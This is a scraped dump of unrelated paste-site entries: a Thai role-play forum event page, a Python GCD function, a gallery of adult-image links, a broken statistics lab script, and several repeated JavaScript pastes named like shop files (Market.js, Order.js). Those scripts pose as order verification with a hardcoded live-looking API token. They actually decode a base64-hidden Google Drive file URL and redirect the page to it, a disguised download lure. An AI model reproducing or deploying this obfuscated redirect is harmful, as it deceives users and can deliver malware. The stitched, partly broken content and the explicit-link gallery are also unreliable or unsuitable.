
  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
pjeT4n5Y,Basket Boy | รับสมัคร #3 (แจกโคด),Kelly-B9978,HTML,Wednesday 2nd of April 2025 11:49:21 AM CDT,"<link href=""https://dl.dropbox.com/scl/fi/vza6zf6ohb8bp34h5z0do/basketboy.css?rlkey=6uhx3edms1l93t8x97gz261al&st=g9d9f36y"" rel=""stylesheet"">
<div id=""BasketBoy""><a href=""https://discord.com/users/625292873914515456/"" target=""_blank""></a><div class=""bkb-set"" style="""">
<div class=""bkb-head""><div class=""bkb-logo""></div>
<div class=""bkb-title"">Activity Code</div>
<div class=""bkb-date""><div>6 - 13</div><div>April</div></div></div>
<h1>Application Code • [url=https://pastebin.com/uqF95GWB]Click[/url]</h1>
<div class=""bkb-content"">
[align=center][size=large][color=red][b]จำกัดโควตาเมจเอเชีย [u]จำนวน 2 คน[/u][/b][/color][/size]

<img src=""https://iili.io/359Ixf4.png"" style=""width: 500px;max-width: 100%;"">[/align]
</div>
<h1>Role-play Code • [url=https://pastebin.com/qwdREKhU]Click[/url]</h1>
<div class=""bkb-content"">
[align=center]<img src=""https://iili.io/3Rpnqn2.png"" style=""width: 500px;max-width: 100%;"">[/align]
</div>
</div></div>"
X9D5U0U8,Basket Boy | รับสมัคร #2 (ตารางเรียน),Kelly-B9978,HTML,Wednesday 2nd of April 2025 11:48:43 AM CDT,"<link href=""https://dl.dropbox.com/scl/fi/vza6zf6ohb8bp34h5z0do/basketboy.css?rlkey=6uhx3edms1l93t8x97gz261al&st=g9d9f36y"" rel=""stylesheet"">
<div id=""BasketBoy""><a href=""https://discord.com/users/625292873914515456/"" target=""_blank""></a><div class=""bkb-set"" style="""">
<div class=""bkb-head""><div class=""bkb-logo""></div>
<div class=""bkb-title"">Activity Code</div>
<div class=""bkb-date""><div>6 - 13</div><div>April</div></div></div>
<h1>Application Code • [url=https://pastebin.com/uqF95GWB]Click[/url]</h1>
<div class=""bkb-content"">
[align=center][size=large][color=red][b]จำกัดโควตาเมจเอเชีย [u]จำนวน 2 คน[/u][/b][/color][/size]

<img src=""https://iili.io/3Rpnqn2.png"" style=""width: 500px;max-width: 100%;"">[/align]
</div>
<h1>Role-play Code • [url=https://pastebin.com/qwdREKhU]Click[/url]</h1>
<div class=""bkb-content"">
[align=center]<img src=""https://iili.io/3Rpnqn2.png"" style=""width: 500px;max-width: 100%;"">[/align]
</div>
</div></div>"
5mNmQivE,Basket Boy | รับสมัคร #1 (ข้อมูลกิจ),Kelly-B9978,HTML,Wednesday 2nd of April 2025 11:48:11 AM CDT,"<link href=""https://dl.dropbox.com/scl/fi/vza6zf6ohb8bp34h5z0do/basketboy.css?rlkey=6uhx3edms1l93t8x97gz261al&st=g9d9f36y"" rel=""stylesheet"">
<div id=""BasketBoy""><a href=""https://discord.com/users/625292873914515456/"" target=""_blank""></a><div class=""bkb-set"" style="""">
<div class=""bkb-head""><div class=""bkb-logo""></div>
<div class=""bkb-title"">Basket Boy</div>
<div class=""bkb-date""><div>6 - 13</div><div>April</div></div></div>
<div class=""bkb-pic"" style=""aspect-ratio: 996/500;--bkb-pic: url(https://iili.io/3RZum2n.png);""></div>
<h1>Activity Overview</h1>
<div class=""bkb-content"">
<iframe src=""https://www.youtube.com/embed/THcoc6IPe5U?si=1HBr90u1iqLuZ6_I"" title=""YouTube video player"" frameborder=""0"" allow=""accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"" referrerpolicy=""strict-origin-when-cross-origin"" allowfullscreen style=""display: block;width: 500px;max-width: 100%;aspect-ratio: 16/9;margin: 0 auto 1rem;""></iframe>[b]นอร์ธเกต  ไฮสกูล[/b] โรงเรียนมัธยมปลายเก่าแก่ที่จัดงานระดมทุนการศึกษาสุดพิเศษด้วยการ [b]ประมูล Basket Boy[/b] โดยในแต่ละปี รายชื่อเด็กหนุ่มที่ได้รับเลือกจะถูกประกาศออกมา พวกเขาต้องมีคุณสมบัติบางประการ เช่น ต้องไม่อยู่ในระหว่างการเดตกับหนุ่มสาวคนใดเลย และนักเรียนที่สนใจทุกคนจะสามารถเข้าร่วมประมูล เพื่อช่วงชิงโอกาสในการได้นั่งปิกนิกใต้ร่มไม้กับหนึ่งในพวกเขา ณ สวนดอกไม้ของโรงเรียน 

[b]คุณคือหนึ่งในนักเรียนของนอร์ธเกต ไฮสกูล[/b] อาจเป็นเพื่อนร่วมชั้นปี รุ่นพี่ หรือรุ่นน้องของเด็กหนุ่มเหล่านั้น แม้จะไม่ได้สนใจเข้าร่วมการประมูลแต่คุณก็หลีกเลี่ยงบทสนทนาเกี่ยวกับมันไม่ได้เลย ทุกครั้งที่เดินผ่านพวกเขา คุณอาจเผลอหันไปมองหรือได้ยินใครบางคนคุยกันถึงเรื่องนี้อย่างตื่นเต้น และในบางครั้งคุณอาจเป็นคนหนึ่งที่พูดถึงพวกเขาเสียเอง

แม้ว่าโรงเรียนจะไม่ได้ต้องการเงินทุนเหมือนในช่วงแรกที่ก่อตั้ง แต่ Basket Boy กลับกลายเป็นธรรมเนียมสุดน่ารักที่ส่งต่อจากรุ่นสู่รุ่น คล้ายกับงานพรอมที่ทุกคนเฝ้ารอ เมื่อลมหนาวพัดผ่านและไออุ่นของฤดูใบไม้ผลิมาเยือนนอร์ธเกต การได้นั่งปิกนิกใต้ร่มไม้กับเด็กชายถือตะกร้าก็กลายเป็นภาพแห่งความทรงจำที่ไม่มีวันจางหาย

ฤดูกาลผลัดเปลี่ยน ปีการศึกษาหมุนเวียนกลับมาใหม่อีกครั้ง ทุกคนยังคงตั้งตารอว่าปีนี้จะมีชื่อของใครปรากฏอยู่ในรายชื่อของ [b]Basket Boy[/b]</div>
<h1>Rewards</h1>
<div class=""bkb-content"">
<div style=""width: 100px;height: 100px;margin-inline: auto;background: url(https://iili.io/3RtISsI.png) center/80px no-repeat, #202020;border-radius: 6px;margin-block-end: 0.5rem;""></div>
[align=center]เหรียญตรากิจกรรม [b]The Basket[/b]
(มูลค่า $100)[/align]
<ol class=""bkb-list"">
<li>ผู้เข้าร่วมกิจกรรมที่มีจำนวนโรลเพลย์ตั้งแต่ [b]20 โพสต์ขึ้นไป[/b] จะได้รับ
<ul>
<li>เงินรางวัล $50</li>
<li>สิทธิ์สุ่มคริสตัล</li>
<li>สิทธิ์ซื้อเหรียญตรากิจกรรม</li>
</ul>
</li>
<li>[b]ผู้ชนะการประมูล[/b] จะได้รับเหรียญตรากิจกรรม [b]ฟรี[/b]</li>
</ol>
[align=center][b][color=red]* รางวัลอาจมีการเปลี่ยนแปลงตามความเหมาะสม *[/color][/b][/align]
</div>
<h1>Duration</h1>
<div class=""bkb-content"">
[align=center][size=large][b]ระยะเวลากิจกรรม[/b] 6 - 13 เมษายน 2568
[b]วันประมูล[/b] 9 เมษายน 2568[/size][/align]
</div>
<h1>Terms & Conditions</h1>
<div class=""bkb-content"">
[align=center][size=large]กิจกรรมนี้เป็นกิจกรรมประเภท [b]มีรายได้[/b]
ผู้ประมูลจะต้องจ่ายเงินดอลลาร์จริง[/size][/align]
</div>
</div></div>"
8HQUu0ke,Market.js,iLoveToWatch,JavaScript,Wednesday 2nd of April 2025 11:46:15 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/925/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
a5FUr9UJ,нод алгоритм евклида,nq1s788,Python,Wednesday 2nd of April 2025 11:42:32 AM CDT,"def gcd(x, y):
    if min(x, y) == 0:
        return max(x, y)
    return gcd(max(x, y) % min(x, y), min(x, y))"
cZRxX9rW,Ian Scott & Ohana Petite - She Knows How To Keep A Secret - Apr 2,MarcSpencer,HTML,Wednesday 2nd of April 2025 11:35:22 AM CDT,"Ian Scott and Ohana Petite - She Knows How To Keep A Secret - Apr 2
<a href=""https://fappic.com/8uvene8l1yi6/622vz0.jpg""><img src=""https://img103.fappic.com/i/03912/8uvene8l1yi6_t.jpg""></a><a href=""https://fappic.com/4nxgavw8s2mh/622vzb.jpg""><img src=""https://img103.fappic.com/i/03912/4nxgavw8s2mh_t.jpg""></a><a href=""https://fappic.com/fmy8llyy9bi3/622vzh.jpg""><img src=""https://img103.fappic.com/i/03912/fmy8llyy9bi3_t.jpg""></a><a href=""https://fappic.com/vii2p1sdis78/622vzj.jpg""><img src=""https://img103.fappic.com/i/03912/vii2p1sdis78_t.jpg""></a><a href=""https://fappic.com/inbqvvpnti8s/622vzn.jpg""><img src=""https://img103.fappic.com/i/03912/inbqvvpnti8s_t.jpg""></a><a href=""https://fappic.com/qswygowljp1i/622vzu.jpg""><img src=""https://img103.fappic.com/i/03912/qswygowljp1i_t.jpg""></a><a href=""https://fappic.com/v8ggv76dso08/622vzy.jpg""><img src=""https://img103.fappic.com/i/03912/v8ggv76dso08_t.jpg""></a><a href=""https://fappic.com/p1nvo8wy5ncq/622w06.jpg""><img src=""https://img103.fappic.com/i/03912/p1nvo8wy5ncq_t.jpg""></a><a href=""https://fappic.com/4dd172qz8grr/622w0e.jpg""><img src=""https://img103.fappic.com/i/03912/4dd172qz8grr_t.jpg""></a><a href=""https://fappic.com/zgizv9h01dbk/622w0l.jpg""><img src=""https://img103.fappic.com/i/03912/zgizv9h01dbk_t.jpg""></a><a href=""https://fappic.com/cppswizw99a6/622w0t.jpg""><img src=""https://img103.fappic.com/i/03912/cppswizw99a6_t.jpg""></a><a href=""https://fappic.com/e2vvc6457slc/622w11.jpg""><img src=""https://img103.fappic.com/i/03912/e2vvc6457slc_t.jpg""></a><a href=""https://fappic.com/gdgu9f1vq89u/622w19.jpg""><img src=""https://img103.fappic.com/i/03912/gdgu9f1vq89u_t.jpg""></a><a href=""https://fappic.com/pjbmm6j6215h/622w1h.jpg""><img src=""https://img103.fappic.com/i/03912/pjbmm6j6215h_t.jpg""></a><a href=""https://fappic.com/v3f9phf97yvt/622w1q.jpg""><img src=""https://img103.fappic.com/i/03912/v3f9phf97yvt_t.jpg""></a><a href=""https://fappic.com/wmmo1nbfqmul/622w1z.jpg""><img src=""https://img103.fappic.com/i/03912/wmmo1nbfqmul_t.jpg""></a><a href=""https://fappic.com/94dnbw9zqo8j/622w26.jpg""><img src=""https://img103.fappic.com/i/03912/94dnbw9zqo8j_t.jpg""></a><a href=""https://fappic.com/yu5i4ouqal1y/622w2g.jpg""><img src=""https://img103.fappic.com/i/03912/yu5i4ouqal1y_t.jpg""></a><a href=""https://fappic.com/i4ofwsvty351/622w2q.jpg""><img src=""https://img103.fappic.com/i/03912/i4ofwsvty351_t.jpg""></a><a href=""https://fappic.com/ryggfba7z5ks/622w2z.jpg""><img src=""https://img103.fappic.com/i/03912/ryggfba7z5ks_t.jpg""></a><a href=""https://fappic.com/tkzk14ucfyfa/622w37.jpg""><img src=""https://img103.fappic.com/i/03912/tkzk14ucfyfa_t.jpg""></a><a href=""https://fappic.com/p517q7za9r7y/622w3i.jpg""><img src=""https://img103.fappic.com/i/03912/p517q7za9r7y_t.jpg""></a><a href=""https://fappic.com/47anbr7ppjn6/622w3s.jpg""><img src=""https://img103.fappic.com/i/03912/47anbr7ppjn6_t.jpg""></a><a href=""https://fappic.com/llwg9irzfdzc/622w3y.jpg""><img src=""https://img103.fappic.com/i/03912/llwg9irzfdzc_t.jpg""></a><a href=""https://fappic.com/yecykgwu6m3w/622w43.jpg""><img src=""https://img103.fappic.com/i/03912/yecykgwu6m3w_t.jpg""></a><a href=""https://fappic.com/622utf3nrtr9/622w49.jpg""><img src=""https://img103.fappic.com/i/03912/622utf3nrtr9_t.jpg""></a><a href=""https://fappic.com/s1wk32uu7580/622w4f.jpg""><img src=""https://img103.fappic.com/i/03912/s1wk32uu7580_t.jpg""></a><a href=""https://fappic.com/jayuwdnrc9ql/622w4m.jpg""><img src=""https://img103.fappic.com/i/03912/jayuwdnrc9ql_t.jpg""></a><a href=""https://fappic.com/vcf3lesoqdge/622w4r.jpg""><img src=""https://img103.fappic.com/i/03912/vcf3lesoqdge_t.jpg""></a><a href=""https://fappic.com/fdz33g8kb4jj/622w4z.jpg""><img src=""https://img103.fappic.com/i/03912/fdz33g8kb4jj_t.jpg""></a><a href=""https://fappic.com/4mczczukf5y7/622w54.jpg""><img src=""https://img103.fappic.com/i/03912/4mczczukf5y7_t.jpg""></a><a href=""https://fappic.com/3itbm7qdd6wl/622w5a.jpg""><img src=""https://img103.fappic.com/i/03912/3itbm7qdd6wl_t.jpg""></a><a href=""https://fappic.com/7lidum5qkveg/622w5f.jpg""><img src=""https://img103.fappic.com/i/03912/7lidum5qkveg_t.jpg""></a><a href=""https://fappic.com/63myzlkhdomm/622w5l.jpg""><img src=""https://img103.fappic.com/i/03912/63myzlkhdomm_t.jpg""></a><a href=""https://fappic.com/ekbnrub8lil5/622w5s.jpg""><img src=""https://img103.fappic.com/i/03912/ekbnrub8lil5_t.jpg""></a><a href=""https://fappic.com/n0te9jgrfn35/622w60.jpg""><img src=""https://img103.fappic.com/i/03912/n0te9jgrfn35_t.jpg""></a><a href=""https://fappic.com/8bajx26d6cju/622w67.jpg""><img src=""https://img103.fappic.com/i/03912/8bajx26d6cju_t.jpg""></a><a href=""https://fappic.com/1s6n9mfwyk9a/622w6f.jpg""><img src=""https://img103.fappic.com/i/03912/1s6n9mfwyk9a_t.jpg""></a><a href=""https://fappic.com/x4a8teebo53u/622w6l.jpg""><img src=""https://img103.fappic.com/i/03912/x4a8teebo53u_t.jpg""></a><a href=""https://fappic.com/nrhnmsp2zork/622w6s.jpg""><img src=""https://img103.fappic.com/i/03912/nrhnmsp2zork_t.jpg""></a><a href=""https://fappic.com/ih9q9q23pot8/622w6y.jpg""><img src=""https://img103.fappic.com/i/03912/ih9q9q23pot8_t.jpg""></a><a href=""https://fappic.com/g1if8d2b01y2/622w77.jpg""><img src=""https://img103.fappic.com/i/03912/g1if8d2b01y2_t.jpg""></a><a href=""https://fappic.com/vkqluf88e0pe/622w7h.jpg""><img src=""https://img103.fappic.com/i/03912/vkqluf88e0pe_t.jpg""></a><a href=""https://fappic.com/dolfc8h0tv50/622w7s.jpg""><img src=""https://img103.fappic.com/i/03912/dolfc8h0tv50_t.jpg""></a><a href=""https://fappic.com/y5j2al9sdm0b/622w85.jpg""><img src=""https://img103.fappic.com/i/03912/y5j2al9sdm0b_t.jpg""></a><a href=""https://fappic.com/852hc3ipwubc/622w8g.jpg""><img src=""https://img103.fappic.com/i/03912/852hc3ipwubc_t.jpg""></a><a href=""https://fappic.com/ozgrb4dubks3/622w8r.jpg""><img src=""https://img103.fappic.com/i/03912/ozgrb4dubks3_t.jpg""></a><a href=""https://fappic.com/71a19mtroxho/622w9f.jpg""><img src=""https://img103.fappic.com/i/03912/71a19mtroxho_t.jpg""></a><a href=""https://fappic.com/9gpn777plqr4/622w9u.jpg""><img src=""https://img103.fappic.com/i/03912/9gpn777plqr4_t.jpg""></a><a href=""https://fappic.com/6iztvpl1a5ql/622wa7.jpg""><img src=""https://img103.fappic.com/i/03912/6iztvpl1a5ql_t.jpg""></a><a href=""https://fappic.com/pe3hvzdnd4a8/622wal.jpg""><img src=""https://img103.fappic.com/i/03912/pe3hvzdnd4a8_t.jpg""></a><a href=""https://fappic.com/mi4sv85m0mie/622way.jpg""><img src=""https://img103.fappic.com/i/03912/mi4sv85m0mie_t.jpg""></a><a href=""https://fappic.com/iaheq8g4ojrm/622wb7.jpg""><img src=""https://img103.fappic.com/i/03912/iaheq8g4ojrm_t.jpg""></a><a href=""https://fappic.com/oldpxdf1n5c0/622wbk.jpg""><img src=""https://img103.fappic.com/i/03912/oldpxdf1n5c0_t.jpg""></a><a href=""https://fappic.com/7ejnjdj8v963/622wbv.jpg""><img src=""https://img103.fappic.com/i/03912/7ejnjdj8v963_t.jpg""></a><a href=""https://fappic.com/jxbwfytyl6ej/622wc7.jpg""><img src=""https://img103.fappic.com/i/03912/jxbwfytyl6ej_t.jpg""></a><a href=""https://fappic.com/a8zgvexw4764/622wcm.jpg""><img src=""https://img103.fappic.com/i/03912/a8zgvexw4764_t.jpg""></a><a href=""https://fappic.com/iogd17k8tj3u/622wd2.jpg""><img src=""https://img103.fappic.com/i/03912/iogd17k8tj3u_t.jpg""></a><a href=""https://fappic.com/82pqcoebysqa/622wds.jpg""><img src=""https://img103.fappic.com/i/03912/82pqcoebysqa_t.jpg""></a><a href=""https://fappic.com/lwq18ko2fahf/622wet.jpg""><img src=""https://img103.fappic.com/i/03912/lwq18ko2fahf_t.jpg""></a><a href=""https://fappic.com/83u1385xq51x/622wfx.jpg""><img src=""https://img103.fappic.com/i/03912/83u1385xq51x_t.jpg""></a><a href=""https://fappic.com/975kbfvwcwtk/622wgs.jpg""><img src=""https://img103.fappic.com/i/03912/975kbfvwcwtk_t.jpg""></a><a href=""https://fappic.com/04rr59v2nsrn/622whn.jpg""><img src=""https://img103.fappic.com/i/03912/04rr59v2nsrn_t.jpg""></a><a href=""https://fappic.com/eckchzlzzy52/622wit.jpg""><img src=""https://img103.fappic.com/i/03912/eckchzlzzy52_t.jpg""></a><a href=""https://fappic.com/u9awyg28cx1v/622wji.jpg""><img src=""https://img103.fappic.com/i/03912/u9awyg28cx1v_t.jpg""></a><a href=""https://fappic.com/8i7jg5kmvrfp/622wkg.jpg""><img src=""https://img103.fappic.com/i/03912/8i7jg5kmvrfp_t.jpg""></a><a href=""https://fappic.com/98tlw4c26txw/622wl7.jpg""><img src=""https://img103.fappic.com/i/03912/98tlw4c26txw_t.jpg""></a><a href=""https://fappic.com/8y22l0xxbztb/622wly.jpg""><img src=""https://img103.fappic.com/i/03912/8y22l0xxbztb_t.jpg""></a><a href=""https://fappic.com/l5e04d2kjnui/622wmx.jpg""><img src=""https://img103.fappic.com/i/03912/l5e04d2kjnui_t.jpg""></a><a href=""https://fappic.com/6xw9mvaofoll/622wnw.jpg""><img src=""https://img103.fappic.com/i/03912/6xw9mvaofoll_t.jpg""></a><a href=""https://fappic.com/w8cozspykqfz/622woq.jpg""><img src=""https://img103.fappic.com/i/03912/w8cozspykqfz_t.jpg""></a><a href=""https://fappic.com/a9a97l44daqf/622wpn.jpg""><img src=""https://img103.fappic.com/i/03912/a9a97l44daqf_t.jpg""></a><a href=""https://fappic.com/lnwabjaw7qlv/622wqb.jpg""><img src=""https://img103.fappic.com/i/03912/lnwabjaw7qlv_t.jpg""></a><a href=""https://fappic.com/e59f09xsmdqv/622wrc.jpg""><img src=""https://img103.fappic.com/i/03912/e59f09xsmdqv_t.jpg""></a><a href=""https://fappic.com/bq6hx2209n4s/622wsb.jpg""><img src=""https://img103.fappic.com/i/03912/bq6hx2209n4s_t.jpg""></a><a href=""https://fappic.com/5f5ge8m99ikw/622wss.jpg""><img src=""https://img103.fappic.com/i/03912/5f5ge8m99ikw_t.jpg""></a><a href=""https://fappic.com/j8el3bu8zl7d/622wtc.jpg""><img src=""https://img103.fappic.com/i/03912/j8el3bu8zl7d_t.jpg""></a><a href=""https://fappic.com/fslusids968z/622wtp.jpg""><img src=""https://img103.fappic.com/i/03912/fslusids968z_t.jpg""></a><a href=""https://fappic.com/dpj16n8kft60/622wty.jpg""><img src=""https://img103.fappic.com/i/03912/dpj16n8kft60_t.jpg""></a><a href=""https://fappic.com/8ca42io01itp/622wu8.jpg""><img src=""https://img103.fappic.com/i/03912/8ca42io01itp_t.jpg""></a><a href=""https://fappic.com/l6pagcqei3ly/622wuh.jpg""><img src=""https://img103.fappic.com/i/03912/l6pagcqei3ly_t.jpg""></a><a href=""https://fappic.com/7s64f5pfdwci/622wuk.jpg""><img src=""https://img103.fappic.com/i/03912/7s64f5pfdwci_t.jpg""></a><a href=""https://fappic.com/nzcln99mx7m7/622wuu.jpg""><img src=""https://img103.fappic.com/i/03912/nzcln99mx7m7_t.jpg""></a><a href=""https://fappic.com/z426128jspgv/622wv6.jpg""><img src=""https://img103.fappic.com/i/03912/z426128jspgv_t.jpg""></a><a href=""https://fappic.com/pa6aer6eloa1/622wvm.jpg""><img src=""https://img103.fappic.com/i/03912/pa6aer6eloa1_t.jpg""></a><a href=""https://fappic.com/isxxvueqvsu2/622wvu.jpg""><img src=""https://img103.fappic.com/i/03912/isxxvueqvsu2_t.jpg""></a><a href=""https://fappic.com/xnj7y4urgvjk/622wwe.jpg""><img src=""https://img103.fappic.com/i/03912/xnj7y4urgvjk_t.jpg""></a><a href=""https://fappic.com/phmwp3au3le4/622wwr.jpg""><img src=""https://img103.fappic.com/i/03912/phmwp3au3le4_t.jpg""></a><a href=""https://fappic.com/qmhpa6jya5e5/622wx0.jpg""><img src=""https://img103.fappic.com/i/03912/qmhpa6jya5e5_t.jpg""></a><a href=""https://fappic.com/i55lq1qzp86r/622wxj.jpg""><img src=""https://img103.fappic.com/i/03912/i55lq1qzp86r_t.jpg""></a><a href=""https://fappic.com/ias756hja3oq/622wy6.jpg""><img src=""https://img103.fappic.com/i/03912/ias756hja3oq_t.jpg""></a><a href=""https://fappic.com/odgjcvuyo73w/622wyq.jpg""><img src=""https://img103.fappic.com/i/03912/odgjcvuyo73w_t.jpg""></a><a href=""https://fappic.com/2ds9k2ub802k/622wz7.jpg""><img src=""https://img103.fappic.com/i/03912/2ds9k2ub802k_t.jpg""></a><a href=""https://fappic.com/pysu0gcp9wa2/622wzx.jpg""><img src=""https://img103.fappic.com/i/03912/pysu0gcp9wa2_t.jpg""></a><a href=""https://fappic.com/9dvicqsukntc/622x0b.jpg""><img src=""https://img103.fappic.com/i/03912/9dvicqsukntc_t.jpg""></a><a href=""https://fappic.com/h1a2ddk7vf9x/622x0o.jpg""><img src=""https://img103.fappic.com/i/03912/h1a2ddk7vf9x_t.jpg""></a><a href=""https://fappic.com/txeosdqfr265/622x16.jpg""><img src=""https://img103.fappic.com/i/03912/txeosdqfr265_t.jpg""></a>

"
6myUBfkX,Untitled,iLoveToWatch,JavaScript,Wednesday 2nd of April 2025 11:30:52 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/070/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Ykpt3bpt,Order.js,iLoveToWatch,JavaScript,Wednesday 2nd of April 2025 11:00:07 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/476/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
K4ctuqhX,Laba_1.1.4,Korotkodul,Python,Wednesday 2nd of April 2025 10:57:10 AM CDT,"matrix20 = [
[39, 41, 41, 21, 40, 26, 32, 31, 35, 43],
[31, 37, 36, 39, 47, 27, 50, 49, 28, 45],
[31, 37, 41, 40, 34, 37, 42, 22, 36, 34],
[36, 45, 31, 41, 26, 37, 41, 33, 37, 31],
[38, 27, 29, 39, 35, 42, 45, 32, 46, 31],
[21, 26, 37, 47, 32, 38, 45, 32, 36, 24],
[37, 37, 30, 33, 29, 42, 29, 34, 35, 38],
[26, 51, 27, 29, 37, 26, 45, 33, 20, 34],
[44, 45, 28, 33, 37, 31, 41, 43, 41, 33],
[39, 41, 42, 30, 30, 46, 35, 30, 45, 39],
[37, 40, 39, 41, 39, 41, 31, 35, 42, 39],
[33, 37, 42, 40, 36, 29, 42, 32, 32, 29],
[35, 30, 52, 49, 39, 40, 36, 30, 34, 41],
[34, 47, 33, 45, 34, 44, 22, 29, 36, 33],
[32, 30, 17, 38, 34, 32, 35, 38, 31, 35],
[22, 39, 29, 28, 34, 36, 35, 36, 38, 44],
[37, 35, 41, 35, 30, 31, 28, 46, 30, 37],
[48, 40, 44, 41, 40, 33, 36, 32, 38, 22],
[32, 43, 34, 45, 34, 46, 38, 38, 28, 39],
[58, 26, 29, 41, 38, 38, 32, 39, 28, 35],
    ]
array = []
for a in matrix20:
  b = []
  for i in range(5):
    b.append(a[2 * i] + a[2 * i + 1])
  array.append(b)

matrix40 = []
for i in range(10):
  a = []
  for j in range(5):
    a.append(cmp40[2 * i][j])
  for j in range(5):
    a.append(cmp40[2 * i + 1][j])
  matrix40.append(a)

for a in matrix40:
  print(a)

from collections import Counter

t10 = []
for a in matrix10:
  for el in a:
    t10.append(el)

t40 = []
for a in matrix40:
  for el in a:
    t40.append(el)
#print(t40)

table40 = sorted(Counter(t40).items(), key = lambda x: x[0])

data40 = []
#print(""TABLE 40"")
for p in table40:
  #print(p[0], p[1], p[1] / len(t40))
  data40.append(tuple( (p[0], p[1] / len(t40)) ))
#print()

""""""cnt = 0
cases = []
for i in range(24):
  a, b = map(int, input().split())
  cases.append(tuple( (a, b) ))
  cnt += b
print(cases)
for p in cases:
  print(p[0], p[1])
print(""cnt:"", cnt)""""""

cases = [(6, 2), (8, 4), (9, 8), (10, 9), (11, 20), (12, 12), (13, 19), (14, 26), (15, 27), (16, 28), (17, 37), (18, 37), (19, 28), (20, 26), (21, 23), (22, 22), (23, 11), (24, 19), (25, 10), (26, 13), (27, 7), (28, 6), (29, 2), (30, 2)]
cnt = 400

data10 = []
for p in cases:
  data10.append(tuple( (p[0], p[1] / cnt) ) )

""""""
print(""DATA, t = 10"")
for p in data10:
  print(p[0], p[1])
  """"""

""""""
print(""DATA, t = 40"")
for p in data40:
  print(p[0], p[1]) """"""

s10 = 0
for p in data10:
  s10 += p[0] * p[1] * 400
n10 = s10 / 400
#print(""s10:"", s10)
#print(""n10:"", n10)

s40 = 0
for p in data40:
  s40 += p[0] * p[1] * 100
n40 = s40 / 100
#print(""s40:"", s40)
#print(""n40:"", n40)

"
7rfyjZ08,Products.js,iLoveToWatch,JavaScript,Wednesday 2nd of April 2025 10:13:59 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/944/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
